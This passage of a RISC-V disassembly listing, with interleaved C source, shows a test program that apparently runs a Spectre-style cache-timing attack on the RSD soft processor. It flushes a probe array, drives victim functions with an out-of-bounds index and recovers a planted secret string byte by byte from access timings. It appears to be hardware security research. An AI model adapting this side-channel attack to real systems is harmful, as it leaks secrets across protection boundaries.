    268c:	0007a703          	lw	a4,0(a5)
    2690:	fd842783          	lw	a5,-40(s0)
    2694:	0007a783          	lw	a5,0(a5)
    2698:	02e7fa63          	bgeu	a5,a4,26cc <cacheAttack+0x178>
			outIdx[0] = i;
    269c:	fe842783          	lw	a5,-24(s0)
    26a0:	0ff7f713          	zext.b	a4,a5
    26a4:	fdc42783          	lw	a5,-36(s0)
    26a8:	00e78023          	sb	a4,0(a5)
			outTimes[0] = results[i];
    26ac:	800067b7          	lui	a5,0x80006
    26b0:	09c78713          	addi	a4,a5,156 # 8000609c <results>
    26b4:	fe842783          	lw	a5,-24(s0)
    26b8:	00279793          	slli	a5,a5,0x2
    26bc:	00f707b3          	add	a5,a4,a5
    26c0:	0007a703          	lw	a4,0(a5)
    26c4:	fd842783          	lw	a5,-40(s0)
    26c8:	00e7a023          	sw	a4,0(a5)
	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
    26cc:	fe842783          	lw	a5,-24(s0)
    26d0:	00178793          	addi	a5,a5,1
    26d4:	fef42423          	sw	a5,-24(s0)
    26d8:	fe842703          	lw	a4,-24(s0)
    26dc:	0ff00793          	li	a5,255
    26e0:	f8e7fce3          	bgeu	a5,a4,2678 <cacheAttack+0x124>
		}

	}

}
    26e4:	00000013          	nop
    26e8:	00000013          	nop
    26ec:	02c12403          	lw	s0,44(sp)
    26f0:	02812483          	lw	s1,40(sp)
    26f4:	03010113          	addi	sp,sp,48
    26f8:	00008067          	ret

000026fc <main>:

void main(){
    26fc:	fd010113          	addi	sp,sp,-48
    2700:	02112623          	sw	ra,44(sp)
    2704:	02812423          	sw	s0,40(sp)
    2708:	03010413          	addi	s0,sp,48

	char* secretString = SECRET_STRING;
    270c:	000037b7          	lui	a5,0x3
    2710:	b0078793          	addi	a5,a5,-1280 # 2b00 <main+0x404>
    2714:	fcf42a23          	sw	a5,-44(s0)

	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);
    2718:	fd442703          	lw	a4,-44(s0)
    271c:	800057b7          	lui	a5,0x80005
    2720:	39c78793          	addi	a5,a5,924 # 8000539c <guideArray>
    2724:	40f707b3          	sub	a5,a4,a5
    2728:	fef42623          	sw	a5,-20(s0)

    for (int i = 0; i < sizeof(guideArray); i++){
    272c:	fe042423          	sw	zero,-24(s0)
    2730:	0280006f          	j	2758 <main+0x5c>
        guideArray[i] = 1;
    2734:	800057b7          	lui	a5,0x80005
    2738:	39c78713          	addi	a4,a5,924 # 8000539c <guideArray>
    273c:	fe842783          	lw	a5,-24(s0)
    2740:	00f707b3          	add	a5,a4,a5
    2744:	00100713          	li	a4,1
    2748:	00e78023          	sb	a4,0(a5)
    for (int i = 0; i < sizeof(guideArray); i++){
    274c:	fe842783          	lw	a5,-24(s0)
    2750:	00178793          	addi	a5,a5,1
    2754:	fef42423          	sw	a5,-24(s0)
    2758:	fe842703          	lw	a4,-24(s0)
    275c:	0ff00793          	li	a5,255
    2760:	fce7fae3          	bgeu	a5,a4,2734 <main+0x38>
    }

	// Write to probeArray so in RAM not copy-on-write zero pages.
	for (int i = 0; i < sizeof(probeArray); i++){
    2764:	fe042223          	sw	zero,-28(s0)
    2768:	0280006f          	j	2790 <main+0x94>
		probeArray[i] = 1;
    276c:	800057b7          	lui	a5,0x80005
    2770:	49c78713          	addi	a4,a5,1180 # 8000549c <probeArray>
    2774:	fe442783          	lw	a5,-28(s0)
    2778:	00f707b3          	add	a5,a4,a5
    277c:	00100713          	li	a4,1
    2780:	00e78023          	sb	a4,0(a5)
	for (int i = 0; i < sizeof(probeArray); i++){
    2784:	fe442783          	lw	a5,-28(s0)
    2788:	00178793          	addi	a5,a5,1
    278c:	fef42223          	sw	a5,-28(s0)
    2790:	fe442703          	lw	a4,-28(s0)
    2794:	7ff00793          	li	a5,2047
    2798:	fce7fae3          	bgeu	a5,a4,276c <main+0x70>
	}

    *outputAddr = '=';
    279c:	800007b7          	lui	a5,0x80000
    27a0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27a4:	03d00713          	li	a4,61
    27a8:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    27ac:	800007b7          	lui	a5,0x80000
    27b0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27b4:	03d00713          	li	a4,61
    27b8:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    27bc:	800007b7          	lui	a5,0x80000
    27c0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27c4:	03d00713          	li	a4,61
    27c8:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'S';
    27cc:	800007b7          	lui	a5,0x80000
    27d0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27d4:	05300713          	li	a4,83
    27d8:	00e78023          	sb	a4,0(a5)
    *outputAddr = 't';
    27dc:	800007b7          	lui	a5,0x80000
    27e0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27e4:	07400713          	li	a4,116
    27e8:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'a';
    27ec:	800007b7          	lui	a5,0x80000
    27f0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27f4:	06100713          	li	a4,97
    27f8:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'r';
    27fc:	800007b7          	lui	a5,0x80000
    2800:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2804:	07200713          	li	a4,114
    2808:	00e78023          	sb	a4,0(a5)
    *outputAddr = 't';
    280c:	800007b7          	lui	a5,0x80000
    2810:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2814:	07400713          	li	a4,116
    2818:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    281c:	800007b7          	lui	a5,0x80000
    2820:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2824:	03d00713          	li	a4,61
    2828:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    282c:	800007b7          	lui	a5,0x80000
    2830:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2834:	03d00713          	li	a4,61
    2838:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    283c:	800007b7          	lui	a5,0x80000
    2840:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2844:	03d00713          	li	a4,61
    2848:	00e78023          	sb	a4,0(a5)
    *outputAddr = '\n';
    284c:	800007b7          	lui	a5,0x80000
    2850:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2854:	00a00713          	li	a4,10
    2858:	00e78023          	sb	a4,0(a5)

	for(uint32_t len = 0; len < SECRET_LENGTH; len++){
    285c:	fe042023          	sw	zero,-32(s0)
    2860:	1e00006f          	j	2a40 <main+0x344>
	
		// Clear results for every character.
		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
    2864:	fc042e23          	sw	zero,-36(s0)
    2868:	0280006f          	j	2890 <main+0x194>
			results[cIdx] = 0;
    286c:	800067b7          	lui	a5,0x80006
    2870:	09c78713          	addi	a4,a5,156 # 8000609c <results>
    2874:	fdc42783          	lw	a5,-36(s0)
    2878:	00279793          	slli	a5,a5,0x2
    287c:	00f707b3          	add	a5,a4,a5
    2880:	0007a023          	sw	zero,0(a5)
		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
    2884:	fdc42783          	lw	a5,-36(s0)
    2888:	00178793          	addi	a5,a5,1
    288c:	fcf42e23          	sw	a5,-36(s0)
    2890:	fdc42703          	lw	a4,-36(s0)
    2894:	0ff00793          	li	a5,255
    2898:	fce7fae3          	bgeu	a5,a4,286c <main+0x170>
		}

		// Run the attack on the same idx for ATTACK_ROUNDS times.
		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
    289c:	fc042c23          	sw	zero,-40(s0)
    28a0:	0640006f          	j	2904 <main+0x208>

			// Make sure array you read from is not in the cache.
			flushCache((uint32_t)probeArray, sizeof(probeArray));
    28a4:	800057b7          	lui	a5,0x80005
    28a8:	49c78713          	addi	a4,a5,1180 # 8000549c <probeArray>
    28ac:	000017b7          	lui	a5,0x1
    28b0:	80078593          	addi	a1,a5,-2048 # 800 <_start-0x800>
    28b4:	00070513          	mv	a0,a4
    28b8:	e74ff0ef          	jal	1f2c <flushCache>

			victimFuncInit(attackIdx);
    28bc:	fec42503          	lw	a0,-20(s0)
    28c0:	f6cff0ef          	jal	202c <victimFuncInit>
			victimFunc[len](attackIdx);
    28c4:	800007b7          	lui	a5,0x80000
    28c8:	37478713          	addi	a4,a5,884 # 80000374 <victimFunc>
    28cc:	fe042783          	lw	a5,-32(s0)
    28d0:	00279793          	slli	a5,a5,0x2
    28d4:	00f707b3          	add	a5,a4,a5
    28d8:	0007a783          	lw	a5,0(a5)
    28dc:	fec42503          	lw	a0,-20(s0)
    28e0:	000780e7          	jalr	a5
					break;
				default:
					break;
			}
*/
			cacheAttack(hitIdx, hitTimes);
    28e4:	800067b7          	lui	a5,0x80006
    28e8:	4a878593          	addi	a1,a5,1192 # 800064a8 <hitTimes>
    28ec:	800067b7          	lui	a5,0x80006
    28f0:	4a478513          	addi	a0,a5,1188 # 800064a4 <hitIdx>
    28f4:	c61ff0ef          	jal	2554 <cacheAttack>
		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
    28f8:	fd842783          	lw	a5,-40(s0)
    28fc:	00178793          	addi	a5,a5,1
    2900:	fcf42c23          	sw	a5,-40(s0)
    2904:	fd842703          	lw	a4,-40(s0)
    2908:	00800793          	li	a5,8
    290c:	f8e7fce3          	bgeu	a5,a4,28a4 <main+0x1a8>

		}

		*outputAddr = 'V';
    2910:	800007b7          	lui	a5,0x80000
    2914:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2918:	05600713          	li	a4,86
    291c:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'a';
    2920:	800007b7          	lui	a5,0x80000
    2924:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2928:	06100713          	li	a4,97
    292c:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'l';
    2930:	800007b7          	lui	a5,0x80000
    2934:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2938:	06c00713          	li	a4,108
    293c:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'u';
    2940:	800007b7          	lui	a5,0x80000
    2944:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2948:	07500713          	li	a4,117
    294c:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'e';
    2950:	800007b7          	lui	a5,0x80000
    2954:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2958:	06500713          	li	a4,101
    295c:	00e78023          	sb	a4,0(a5)
    	*outputAddr = ':';
    2960:	800007b7          	lui	a5,0x80000
    2964:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2968:	03a00713          	li	a4,58
    296c:	00e78023          	sb	a4,0(a5)
    	*outputAddr = ' ';
    2970:	800007b7          	lui	a5,0x80000
    2974:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2978:	02000713          	li	a4,32
    297c:	00e78023          	sb	a4,0(a5)
		*outputAddr = (char)hitIdx[0];
    2980:	800007b7          	lui	a5,0x80000
    2984:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2988:	80006737          	lui	a4,0x80006
    298c:	4a474703          	lbu	a4,1188(a4) # 800064a4 <hitIdx>
    2990:	00e78023          	sb	a4,0(a5)
        *outputAddr = ' ';
    2994:	800007b7          	lui	a5,0x80000
    2998:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    299c:	02000713          	li	a4,32
    29a0:	00e78023          	sb	a4,0(a5)
        *outputAddr = 'H';
    29a4:	800007b7          	lui	a5,0x80000
    29a8:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29ac:	04800713          	li	a4,72
    29b0:	00e78023          	sb	a4,0(a5)
        *outputAddr = 'i';
    29b4:	800007b7          	lui	a5,0x80000
    29b8:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29bc:	06900713          	li	a4,105
    29c0:	00e78023          	sb	a4,0(a5)
        *outputAddr = 't';
    29c4:	800007b7          	lui	a5,0x80000
    29c8:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29cc:	07400713          	li	a4,116
    29d0:	00e78023          	sb	a4,0(a5)
        *outputAddr = ':';
    29d4:	800007b7          	lui	a5,0x80000
    29d8:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29dc:	03a00713          	li	a4,58
    29e0:	00e78023          	sb	a4,0(a5)
        *outputAddr = ' ';
    29e4:	800007b7          	lui	a5,0x80000
    29e8:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29ec:	02000713          	li	a4,32
    29f0:	00e78023          	sb	a4,0(a5)
		*outputAddr = (char)hitTimes[0] + '0';
    29f4:	800067b7          	lui	a5,0x80006
    29f8:	4a878793          	addi	a5,a5,1192 # 800064a8 <hitTimes>
    29fc:	0007a783          	lw	a5,0(a5)
    2a00:	0ff7f713          	zext.b	a4,a5
    2a04:	800007b7          	lui	a5,0x80000
    2a08:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a0c:	03070713          	addi	a4,a4,48
    2a10:	0ff77713          	zext.b	a4,a4
    2a14:	00e78023          	sb	a4,0(a5)
        *outputAddr = '\n';
    2a18:	800007b7          	lui	a5,0x80000
    2a1c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a20:	00a00713          	li	a4,10
    2a24:	00e78023          	sb	a4,0(a5)

		attackIdx++;
    2a28:	fec42783          	lw	a5,-20(s0)
    2a2c:	00178793          	addi	a5,a5,1
    2a30:	fef42623          	sw	a5,-20(s0)
	for(uint32_t len = 0; len < SECRET_LENGTH; len++){
    2a34:	fe042783          	lw	a5,-32(s0)
    2a38:	00178793          	addi	a5,a5,1
    2a3c:	fef42023          	sw	a5,-32(s0)
    2a40:	fe042703          	lw	a4,-32(s0)
    2a44:	00400793          	li	a5,4
    2a48:	e0e7fee3          	bgeu	a5,a4,2864 <main+0x168>

	}

    *outputAddr = '=';
    2a4c:	800007b7          	lui	a5,0x80000
    2a50:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a54:	03d00713          	li	a4,61
    2a58:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2a5c:	800007b7          	lui	a5,0x80000
    2a60:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a64:	03d00713          	li	a4,61
    2a68:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2a6c:	800007b7          	lui	a5,0x80000
    2a70:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a74:	03d00713          	li	a4,61
    2a78:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'E';
    2a7c:	800007b7          	lui	a5,0x80000
    2a80:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a84:	04500713          	li	a4,69
    2a88:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'n';
    2a8c:	800007b7          	lui	a5,0x80000
    2a90:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a94:	06e00713          	li	a4,110
    2a98:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'd';
    2a9c:	800007b7          	lui	a5,0x80000
    2aa0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2aa4:	06400713          	li	a4,100
    2aa8:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2aac:	800007b7          	lui	a5,0x80000
    2ab0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ab4:	03d00713          	li	a4,61
    2ab8:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2abc:	800007b7          	lui	a5,0x80000
    2ac0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ac4:	03d00713          	li	a4,61
    2ac8:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2acc:	800007b7          	lui	a5,0x80000
    2ad0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ad4:	03d00713          	li	a4,61
    2ad8:	00e78023          	sb	a4,0(a5)
    *outputAddr = '\n';
    2adc:	800007b7          	lui	a5,0x80000
    2ae0:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ae4:	00a00713          	li	a4,10
    2ae8:	00e78023          	sb	a4,0(a5)

}
    2aec:	00000013          	nop
    2af0:	02c12083          	lw	ra,44(sp)
    2af4:	02812403          	lw	s0,40(sp)
    2af8:	03010113          	addi	sp,sp,48
    2afc:	00008067          	ret

Disassembly of section .rodata:

00002b00 <__rodata_end-0x6>:
    2b00:	4952                	.insn	2, 0x4952
    2b02:	00564353          	fadd.s	ft6,fa2,ft5,rmm

Disassembly of section .data:

80000000 <__data_start>:
80000000:	34335b1b          	.insn	4, 0x34335b1b
80000004:	0a6d                	.insn	2, 0x0a6d
80000006:	7845                	.insn	2, 0x7845
80000008:	74706563          	bltu	zero,t2,80000752 <__data_end+0x3b6>
8000000c:	6f69                	.insn	2, 0x6f69
8000000e:	206e                	.insn	2, 0x206e
80000010:	73756163          	bltu	a0,s7,80000732 <__data_end+0x396>
80000014:	6465                	.insn	2, 0x6465
80000016:	0a2e                	.insn	2, 0x0a2e
	...
80000020:	636d                	.insn	2, 0x636d
80000022:	7561                	.insn	2, 0x7561
80000024:	003a6573          	csrrsi	a0,fcsr,20
	...
80000040:	3130                	.insn	2, 0x3130
80000042:	3332                	.insn	2, 0x3332
80000044:	3534                	.insn	2, 0x3534
80000046:	3736                	.insn	2, 0x3736
80000048:	3938                	.insn	2, 0x3938
8000004a:	6261                	.insn	2, 0x6261
8000004c:	66656463          	bltu	a0,t1,800006b4 <__data_end+0x318>
	...
80000060:	3130                	.insn	2, 0x3130
80000062:	3332                	.insn	2, 0x3332
80000064:	3534                	.insn	2, 0x3534
80000066:	3736                	.insn	2, 0x3736
80000068:	3938                	.insn	2, 0x3938
8000006a:	6261                	.insn	2, 0x6261
8000006c:	66656463          	bltu	a0,t1,800006d4 <__data_end+0x338>
	...
80000080:	3130                	.insn	2, 0x3130
80000082:	3332                	.insn	2, 0x3332
80000084:	3534                	.insn	2, 0x3534
80000086:	3736                	.insn	2, 0x3736
80000088:	3938                	.insn	2, 0x3938
8000008a:	6261                	.insn	2, 0x6261
8000008c:	66656463          	bltu	a0,t1,800006f4 <__data_end+0x358>
	...
800000a0:	3130                	.insn	2, 0x3130
800000a2:	3332                	.insn	2, 0x3332
800000a4:	3534                	.insn	2, 0x3534
800000a6:	3736                	.insn	2, 0x3736
800000a8:	3938                	.insn	2, 0x3938
800000aa:	6261                	.insn	2, 0x6261
800000ac:	66656463          	bltu	a0,t1,80000714 <__data_end+0x378>
	...
800000c0:	6d20                	.insn	2, 0x6d20
800000c2:	7065                	.insn	2, 0x7065
800000c4:	00003a63          	.insn	4, 0x3a63
	...
800000e0:	3130                	.insn	2, 0x3130
800000e2:	3332                	.insn	2, 0x3332
800000e4:	3534                	.insn	2, 0x3534
800000e6:	3736                	.insn	2, 0x3736
800000e8:	3938                	.insn	2, 0x3938
800000ea:	6261                	.insn	2, 0x6261
800000ec:	66656463          	bltu	a0,t1,80000754 <__data_end+0x3b8>
	...
80000100:	3130                	.insn	2, 0x3130
80000102:	3332                	.insn	2, 0x3332
80000104:	3534                	.insn	2, 0x3534
80000106:	3736                	.insn	2, 0x3736
80000108:	3938                	.insn	2, 0x3938
8000010a:	6261                	.insn	2, 0x6261
8000010c:	66656463          	bltu	a0,t1,80000774 <__data_end+0x3d8>
	...
80000120:	3130                	.insn	2, 0x3130
80000122:	3332                	.insn	2, 0x3332
80000124:	3534                	.insn	2, 0x3534
80000126:	3736                	.insn	2, 0x3736
80000128:	3938                	.insn	2, 0x3938
8000012a:	6261                	.insn	2, 0x6261
8000012c:	66656463          	bltu	a0,t1,80000794 <__data_end+0x3f8>
	...
80000140:	3130                	.insn	2, 0x3130
80000142:	3332                	.insn	2, 0x3332
80000144:	3534                	.insn	2, 0x3534
80000146:	3736                	.insn	2, 0x3736
80000148:	3938                	.insn	2, 0x3938
8000014a:	6261                	.insn	2, 0x6261
8000014c:	66656463          	bltu	a0,t1,800007b4 <__data_end+0x418>
	...
80000160:	6d20                	.insn	2, 0x6d20
80000162:	6162                	.insn	2, 0x6162
80000164:	6164                	.insn	2, 0x6164
80000166:	6464                	.insn	2, 0x6464
80000168:	3a72                	.insn	2, 0x3a72
	...
8000017e:	0000                	.insn	2, 0x
80000180:	3130                	.insn	2, 0x3130
80000182:	3332                	.insn	2, 0x3332
80000184:	3534                	.insn	2, 0x3534
80000186:	3736                	.insn	2, 0x3736
80000188:	3938                	.insn	2, 0x3938
8000018a:	6261                	.insn	2, 0x6261
8000018c:	66656463          	bltu	a0,t1,800007f4 <__data_end+0x458>
	...
800001a0:	3130                	.insn	2, 0x3130
800001a2:	3332                	.insn	2, 0x3332
800001a4:	3534                	.insn	2, 0x3534
800001a6:	3736                	.insn	2, 0x3736
800001a8:	3938                	.insn	2, 0x3938
800001aa:	6261                	.insn	2, 0x6261
800001ac:	66656463          	bltu	a0,t1,80000814 <__data_end+0x478>
	...
800001c0:	3130                	.insn	2, 0x3130
800001c2:	3332                	.insn	2, 0x3332
800001c4:	3534                	.insn	2, 0x3534
800001c6:	3736                	.insn	2, 0x3736
800001c8:	3938                	.insn	2, 0x3938
800001ca:	6261                	.insn	2, 0x6261
800001cc:	66656463          	bltu	a0,t1,80000834 <__data_end+0x498>
	...
800001e0:	3130                	.insn	2, 0x3130
800001e2:	3332                	.insn	2, 0x3332
800001e4:	3534                	.insn	2, 0x3534
800001e6:	3736                	.insn	2, 0x3736
800001e8:	3938                	.insn	2, 0x3938
800001ea:	6261                	.insn	2, 0x6261
800001ec:	66656463          	bltu	a0,t1,80000854 <__data_end+0x4b8>
	...
80000200:	000a                	.insn	2, 0x000a
	...
8000021e:	0000                	.insn	2, 0x
80000220:	3130                	.insn	2, 0x3130
80000222:	3332                	.insn	2, 0x3332
80000224:	3534                	.insn	2, 0x3534
80000226:	3736                	.insn	2, 0x3736
80000228:	3938                	.insn	2, 0x3938
8000022a:	6261                	.insn	2, 0x6261
8000022c:	66656463          	bltu	a0,t1,80000894 <__data_end+0x4f8>
	...
80000240:	3130                	.insn	2, 0x3130
80000242:	3332                	.insn	2, 0x3332
80000244:	3534                	.insn	2, 0x3534
80000246:	3736                	.insn	2, 0x3736
80000248:	3938                	.insn	2, 0x3938
8000024a:	6261                	.insn	2, 0x6261
8000024c:	66656463          	bltu	a0,t1,800008b4 <__data_end+0x518>
	...
80000260:	3130                	.insn	2, 0x3130
80000262:	3332                	.insn	2, 0x3332
80000264:	3534                	.insn	2, 0x3534
80000266:	3736                	.insn	2, 0x3736
80000268:	3938                	.insn	2, 0x3938
8000026a:	6261                	.insn	2, 0x6261
8000026c:	66656463          	bltu	a0,t1,800008d4 <__data_end+0x538>
	...
80000280:	3130                	.insn	2, 0x3130
80000282:	3332                	.insn	2, 0x3332
80000284:	3534                	.insn	2, 0x3534
80000286:	3736                	.insn	2, 0x3736
80000288:	3938                	.insn	2, 0x3938
8000028a:	6261                	.insn	2, 0x6261
8000028c:	66656463          	bltu	a0,t1,800008f4 <__data_end+0x558>
	...
800002a0:	203a                	.insn	2, 0x203a
	...
800002be:	0000                	.insn	2, 0x
800002c0:	3130                	.insn	2, 0x3130
800002c2:	3332                	.insn	2, 0x3332
800002c4:	3534                	.insn	2, 0x3534
800002c6:	3736                	.insn	2, 0x3736
800002c8:	3938                	.insn	2, 0x3938
800002ca:	6261                	.insn	2, 0x6261
800002cc:	66656463          	bltu	a0,t1,80000934 <__data_end+0x598>
	...
800002e0:	3130                	.insn	2, 0x3130
800002e2:	3332                	.insn	2, 0x3332
800002e4:	3534                	.insn	2, 0x3534
800002e6:	3736                	.insn	2, 0x3736
800002e8:	3938                	.insn	2, 0x3938
800002ea:	6261                	.insn	2, 0x6261
800002ec:	66656463          	bltu	a0,t1,80000954 <__data_end+0x5b8>
	...
80000300:	3130                	.insn	2, 0x3130
80000302:	3332                	.insn	2, 0x3332
80000304:	3534                	.insn	2, 0x3534
80000306:	3736                	.insn	2, 0x3736
80000308:	3938                	.insn	2, 0x3938
8000030a:	6261                	.insn	2, 0x6261
8000030c:	66656463          	bltu	a0,t1,80000974 <__data_end+0x5d8>
	...
80000320:	3130                	.insn	2, 0x3130
80000322:	3332                	.insn	2, 0x3332
80000324:	3534                	.insn	2, 0x3534
80000326:	3736                	.insn	2, 0x3736
80000328:	3938                	.insn	2, 0x3938
8000032a:	6261                	.insn	2, 0x6261
8000032c:	66656463          	bltu	a0,t1,80000994 <__data_end+0x5f8>
	...
80000340:	000a                	.insn	2, 0x000a
	...
8000034e:	0000                	.insn	2, 0x
80000350:	6261                	.insn	2, 0x6261
80000352:	6974726f          	jal	tp,800481e8 <stack_top+0x281e8>
80000356:	676e                	.insn	2, 0x676e
80000358:	2e2e                	.insn	2, 0x2e2e
8000035a:	0a2e                	.insn	2, 0x0a2e
8000035c:	6d305b1b          	.insn	4, 0x6d305b1b
	...

80000370 <hello_str>:
80000370:	5352                	.insn	2, 0x5352
80000372:	0044                	.insn	2, 0x0044

80000374 <victimFunc>:

// (Obsolete since RSD will also predict victimFunc[](uint32_t). Need to directly call victimFunc_n above from main.)
/* Limited by nature of C language and current capability of RSD, the size of victimFunc array has to be static.
 * Size of this array should be the same as SECRET_LENGTH in main body of the source code.
 */
void (*victimFunc[])(uint32_t) = {
80000374:	2108                	.insn	2, 0x2108
80000376:	0000                	.insn	2, 0x
80000378:	21e4                	.insn	2, 0x21e4
8000037a:	0000                	.insn	2, 0x
8000037c:	22c0                	.insn	2, 0x22c0
8000037e:	0000                	.insn	2, 0x
80000380:	239c                	.insn	2, 0x239c
80000382:	0000                	.insn	2, 0x
80000384:	2478                	.insn	2, 0x2478
	...

80000388 <flush_junk>:
uint8_t flush_junk = 0;
80000388:	0000                	.insn	2, 0x
	...

8000038c <outputAddr>:
volatile char* outputAddr = (char*)0x40002000;
8000038c:	2000                	.insn	2, 0x2000
8000038e:	4000                	.insn	2, 0x4000

80000390 <anchorVar>:
	...

80000391 <shift_base>:
uint8_t shift_base = 2;
80000391:	0002                	.insn	2, 0x0002
	...

80000394 <tempArrayIndex>:
uint32_t tempArrayIndex = 1;
80000394:	0001                	.insn	2, 0x0001
	...

80000398 <tempArrayIndexInit>:
uint32_t tempArrayIndexInit = 2;
80000398:	0002                	.insn	2, 0x0002
	...

Disassembly of section .comment:

00002ea2 <.comment>:
    2ea2:	3a434347          	.insn	4, 0x3a434347
    2ea6:	2820                	.insn	2, 0x2820
    2ea8:	2029                	.insn	2, 0x2029
    2eaa:	3331                	.insn	2, 0x3331
    2eac:	322e                	.insn	2, 0x322e
    2eae:	302e                	.insn	2, 0x302e
	...

Disassembly of section .riscv.attributes:

00000000 <.riscv.attributes>:
   0:	3b41                	.insn	2, 0x3b41
   2:	0000                	.insn	2, 0x
   4:	7200                	.insn	2, 0x7200
   6:	7369                	.insn	2, 0x7369
   8:	01007663          	bgeu	zero,a6,14 <_start-0xfec>
   c:	0031                	.insn	2, 0x0031
   e:	0000                	.insn	2, 0x
  10:	1004                	.insn	2, 0x1004
  12:	7205                	.insn	2, 0x7205
  14:	3376                	.insn	2, 0x3376
  16:	6932                	.insn	2, 0x6932
  18:	7032                	.insn	2, 0x7032
  1a:	5f31                	.insn	2, 0x5f31
  1c:	326d                	.insn	2, 0x326d
  1e:	3070                	.insn	2, 0x3070
  20:	665f 7032 5f32      	.insn	6, 0x5f327032665f
  26:	697a                	.insn	2, 0x697a
  28:	32727363          	bgeu	tp,t2,34e <_start-0xcb2>
  2c:	3070                	.insn	2, 0x3070
  2e:	7a5f 6d6d 6c75      	.insn	6, 0x6c756d6d7a5f
  34:	7031                	.insn	2, 0x7031
  36:	0030                	.insn	2, 0x0030
  38:	0108                	.insn	2, 0x0108
  3a:	0b0a                	.insn	2, 0x0b0a

Disassembly of section .debug_line:

00000000 <.debug_line>:
       0:	0354                	.insn	2, 0x0354
       2:	0000                	.insn	2, 0x
       4:	0005                	.insn	2, 0x0005
       6:	0004                	.insn	2, 0x0004
       8:	002a                	.insn	2, 0x002a
       a:	0000                	.insn	2, 0x
       c:	0101                	.insn	2, 0x0101
       e:	fb01                	.insn	2, 0xfb01
      10:	0d0e                	.insn	2, 0x0d0e
      12:	0100                	.insn	2, 0x0100
      14:	0101                	.insn	2, 0x0101
      16:	0001                	.insn	2, 0x0001
      18:	0000                	.insn	2, 0x
      1a:	0001                	.insn	2, 0x0001
      1c:	0100                	.insn	2, 0x0100
      1e:	0101                	.insn	2, 0x0101
      20:	011f 0000 0000      	.insn	6, 0x011f
      26:	0102                	.insn	2, 0x0102
      28:	021f 020f 003b      	.insn	6, 0x003b020f021f
      2e:	0000                	.insn	2, 0x
      30:	3b00                	.insn	2, 0x3b00
      32:	0000                	.insn	2, 0x
      34:	0000                	.insn	2, 0x
      36:	0500                	.insn	2, 0x0500
      38:	0002                	.insn	2, 0x0002
      3a:	0010                	.insn	2, 0x0010
      3c:	0300                	.insn	2, 0x0300
      3e:	03030113          	addi	sp,t1,48
      42:	0409                	.insn	2, 0x0409
      44:	0100                	.insn	2, 0x0100
      46:	04090303          	lb	t1,64(s2)
      4a:	0100                	.insn	2, 0x0100
      4c:	04090103          	lb	sp,64(s2)
      50:	0100                	.insn	2, 0x0100
      52:	04090403          	lb	s0,64(s2)
      56:	0100                	.insn	2, 0x0100
